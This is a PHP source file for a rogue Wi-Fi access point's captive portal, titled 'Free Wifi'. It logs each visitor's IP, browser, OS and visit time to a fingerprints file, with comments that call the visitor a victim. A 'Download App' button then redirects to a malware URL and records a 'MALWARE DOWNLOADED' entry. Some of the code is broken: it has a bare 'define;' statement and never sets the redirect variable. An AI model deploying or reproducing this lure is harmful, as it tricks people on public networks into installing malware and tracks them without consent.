<?php

/*
*  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
*  wifi agent is a rogue access point.
*
*  wifi agent is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  wifi agent is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/

// Set File write informations
$file = "{$_SERVER['DOCUMENT_ROOT']}/fingerprints.txt";


// Get Full date of victim visit
$full_date = date("d-m-Y h:i:s");


// Get Victim IP
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}


// Get Victim Browser
$browser = $_SERVER['HTTP_USER_AGENT'];


// Get Victim Os System

function get_operating_system() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $operating_system = 'Unknown Operating System';

    //Get the operating_system name
    if (preg_match('/linux/i', $u_agent)) {
        $operating_system = 'Linux';
    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $u_agent)) {
        $operating_system = 'Mac';
    } elseif (preg_match('/windows|win32|win98|win95|win16/i', $u_agent)) {
        $operating_system = 'Windows';
    } elseif (preg_match('/ubuntu/i', $u_agent)) {
        $operating_system = 'Ubuntu';
    } elseif (preg_match('/iphone/i', $u_agent)) {
        $operating_system = 'IPhone';
    } elseif (preg_match('/ipod/i', $u_agent)) {
        $operating_system = 'IPod';
    } elseif (preg_match('/ipad/i', $u_agent)) {
        $operating_system = 'IPad';
    } elseif (preg_match('/android/i', $u_agent)) {
        $operating_system = 'Android';
    } elseif (preg_match('/blackberry/i', $u_agent)) {
        $operating_system = 'Blackberry';
    } elseif (preg_match('/webos/i', $u_agent)) {
        $operating_system = 'Mobile';
    }
    
    return $operating_system;
}


$os_system = get_operating_system();





file_put_contents($file, print_r("\nMALWARE FINGERPRINTS => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("IP: $ip \n", true), FILE_APPEND);
file_put_contents($file, print_r("Full-Date: $full_date \n", true), FILE_APPEND);
file_put_contents($file, print_r("User-Agent: $browser \n", true), FILE_APPEND);
file_put_contents($file, print_r("OS-System: $os_system \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);

?>



<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title> Free Wifi </title>
  
  <link rel="icon" type="image/png" href="free-wifi-logo-2.png"/>

<style>

body
{ 
background: linear-gradient(#f14c4c, #0000ff) fixed;
}

img
{
filter: invert(98%) sepia(93%) saturate(207%) hue-rotate(130deg) brightness(95%) contrast(80%);
}

a
{
background: #F14C4C;	
border-style: solid;
border-width : 2px 2px 2px 2px;
text-decoration : none;
padding : 15px;
border-color : #F14C4C;
color: white;
}


a:hover 
{
background: #F02C2C;	
border-style: solid;
border-width : 2px 2px 2px 2px;
text-decoration : none;
padding : 15px;
border-color : ##F02C2C;
color: white;
}


</style>


</head>

<body>



    <div align="center">

	 <img src="free-wifi-logo-2.png" alt="" height="35%" width="35%">
		 
			
      <font color="white"> 
		 
        <h1> Welcome! </h1>
        <h3> <i> Download the app for access the wifi. </i> </h3>
      
      </font>
      
       <br> <br>
         
        <a href="?download=ok" name="download_app"> Download App </a>       
          
    </div>

 

</body>

</html>


<?php

     if ($_SERVER['QUERY_STRING'] == 'download=ok')
        {
      
      define;
            
  
         
   	  header("Location: $malware_d");
	   	
	   	
  // Set File write informations
$file2 = "{$_SERVER['DOCUMENT_ROOT']}/fingerprints.txt";


// Get Full date of victim visit
$full_date2 = date("d-m-Y h:i:s");


// Get Victim IP
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip2 = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip2 = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip2 = $_SERVER['REMOTE_ADDR'];
}


// Get Victim Browser
$browser2 = $_SERVER['HTTP_USER_AGENT'];


// Get Victim Os System

function get_operating_system2() {
    $u_agent2 = $_SERVER['HTTP_USER_AGENT'];
    $operating_system2 = 'Unknown Operating System';

    //Get the operating_system name
    if (preg_match('/linux/i', $u_agent2)) {
        $operating_system2 = 'Linux';
    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $u_agent2)) {
        $operating_system2 = 'Mac';
    } elseif (preg_match('/windows|win32|win98|win95|win16/i', $u_agent2)) {
        $operating_system2 = 'Windows';
    } elseif (preg_match('/ubuntu/i', $u_agent2)) {
        $operating_system2 = 'Ubuntu';
    } elseif (preg_match('/iphone/i', $u_agent2)) {
        $operating_system2 = 'IPhone';
    } elseif (preg_match('/ipod/i', $u_agent2)) {
        $operating_system2 = 'IPod';
    } elseif (preg_match('/ipad/i', $u_agent2)) {
        $operating_system2 = 'IPad';
    } elseif (preg_match('/android/i', $u_agent2)) {
        $operating_system2 = 'Android';
    } elseif (preg_match('/blackberry/i', $u_agent2)) {
        $operating_system2 = 'Blackberry';
    } elseif (preg_match('/webos/i', $u_agent2)) {
        $operating_system2 = 'Mobile';
    }
    
    return $operating_system2;
}


$os_system2 = get_operating_system2();





file_put_contents($file2, print_r("\nMALWARE DOWNLOADED => Informations \n", true), FILE_APPEND);
file_put_contents($file2, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file2, print_r("IP: $ip2//VICTIM//MALWARE_DOWNLOADED \n", true), FILE_APPEND);
file_put_contents($file2, print_r("Full-Date: $full_date2 \n", true), FILE_APPEND);
file_put_contents($file2, print_r("User-Agent: $browser2 \n", true), FILE_APPEND);
file_put_contents($file2, print_r("OS-System: $os_system2 \n", true), FILE_APPEND);
file_put_contents($file2, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file2, print_r("\n", true), FILE_APPEND);
	

}
    

?>
